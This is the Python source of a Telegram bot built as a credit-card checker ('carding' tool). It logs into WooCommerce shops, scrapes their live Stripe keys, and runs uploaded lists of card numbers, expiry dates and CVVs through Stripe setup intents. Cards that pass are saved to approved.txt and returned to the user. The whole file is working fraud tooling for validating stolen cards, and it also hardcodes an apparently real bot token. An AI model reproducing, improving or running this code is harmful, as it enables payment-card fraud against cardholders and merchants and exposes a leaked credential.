import logging
import requests
import re
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from io import BytesIO

BOT_TOKEN = "8153748905:AAGp03pGvNcuL7CAhcOV92jGv2c9opX-BVU"

logging.basicConfig(level=logging.INFO)
user_data = {}

def get_headers():
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9"
    }

def extract_pk(html):
    match = re.search(r'pk_live_[a-zA-Z0-9]{10,}', html)
    return match.group(0) if match else None

def detect_stripe_type(html):
    if "setup_intent" in html:
        return "setup_intent"
    elif "payment_method" in html:
        return "payment_method"
    elif "source" in html:
        return "source"
    elif "token" in html:
        return "token"
    return "unknown"

def try_login(site, email, password):
    session = requests.Session()
    login_url = f"https://{site}/my-account/"
    r = session.get(login_url, headers=get_headers())
    soup = BeautifulSoup(r.text, 'html.parser')
    nonce = soup.find("input", {"name": "woocommerce-login-nonce"})
    referer = soup.find("input", {"name": "_wp_http_referer"})

    if not nonce:
        return None, "Login page error"

    payload = {
        'username': email,
        'password': password,
        'woocommerce-login-nonce': nonce["value"],
        '_wp_http_referer': referer["value"] if referer else "/my-account/",
        'login': 'Log in'
    }

    r = session.post(login_url, data=payload, headers=get_headers())
    if "customer-logout" in r.text:
        return session, r.text
    return None, "Login failed"

async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args or len(args) < 1 or '|' not in args[0]:
        await update.message.reply_text("Usage: /addsitelogin site|email|password")
        return

    site, email, password = args[0].split("|")
    session, resp_html = try_login(site, email, password)
    if not session:
        await update.message.reply_text(f"Login failed: {resp_html}")
        return

    user_data[user_id] = {
        "site": site,
        "email": email,
        "password": password,
        "session": session,
    }

    await update.message.reply_text("Login successful! Now send the Add Payment Method URL.")

async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data:
        await update.message.reply_text("Please login first using /addsitelogin")
        return

    url = update.message.text
    session = user_data[user_id]["session"]
    r = session.get(url, headers=get_headers())

    pk_live = extract_pk(r.text)
    stripe_type = detect_stripe_type(r.text)

    if not pk_live or stripe_type == "unknown":
        await update.message.reply_text("Failed to detect Stripe configuration.")
        return

    user_data[user_id]["check_url"] = url
    user_data[user_id]["pk"] = pk_live
    user_data[user_id]["stripe_type"] = stripe_type

    await update.message.reply_text(f"Stripe key: `{pk_live}`\nType: `{stripe_type}`", parse_mode="Markdown")

def parse_card(card):
    match = re.match(r'(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})', card)
    return match.groups() if match else None

def check_card(card, data):
    try:
        cc, mm, yy, cvv = parse_card(card)
        if len(yy) == 2:
            yy = "20" + yy

        session = data["session"]
        site = data["site"]
        pk = data["pk"]
        stripe_type = data["stripe_type"]
        check_url = data["check_url"]

        r = session.get(check_url, headers=get_headers())
        nonce_match = re.search(r'"(\w{10,})"', r.text)
        ajax_nonce = nonce_match.group(1) if nonce_match else None

        r = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers={
                "Authorization": f"Bearer {pk}"
            },
            data={
                "type": "card",
                "card[number]": cc,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "card[cvc]": cvv,
            }
        )
        stripe_resp = r.json()
        if 'error' in stripe_resp:
            return f"{card} -> Declined ❌ ({stripe_resp['error']['message']})"

        pm_id = stripe_resp['id']

        payload = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce
        }

        ajax_url = f"https://{site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
        final = session.post(ajax_url, data=payload, headers={"X-Requested-With": "XMLHttpRequest"})

        json_resp = final.json()
        if json_resp.get("success") and json_resp.get("data", {}).get("status") == "succeeded":
            with open("approved.txt", "a") as f:
                f.write(card + "\n")
            return f"{card} -> Approved ✅"
        return f"{card} -> Declined ❌"
    except Exception as e:
        return f"{card} -> Error: {e}"

async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data:
        await update.message.reply_text("Please use /addsitelogin first.")
        return

    file = await update.message.document.get_file()
    content = await file.download_as_bytes()
    lines = content.decode().splitlines()

    stats = {"total": 0, "approved": 0, "declined": 0, "errors": 0}
    msg = await update.message.reply_text("Starting...")

    for card in lines:
        stats["total"] += 1
        result = check_card(card, user_data[user_id])
        if "Approved" in result:
            stats["approved"] += 1
        elif "Declined" in result:
            stats["declined"] += 1
        else:
            stats["errors"] += 1

        await msg.edit_text(
            f"Total: {stats['total']} | ✅ {stats['approved']} | ❌ {stats['declined']} | ⚠️ {stats['errors']}"
        )

    with open("approved.txt", "rb") as f:
        await update.message.reply_document(document=BytesIO(f.read()), filename="approved.txt")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
    app.add_handler(MessageHandler(filters.Document.TEXT, mchk))
    app.run_polling()

if __name__ == "__main__":
    main()
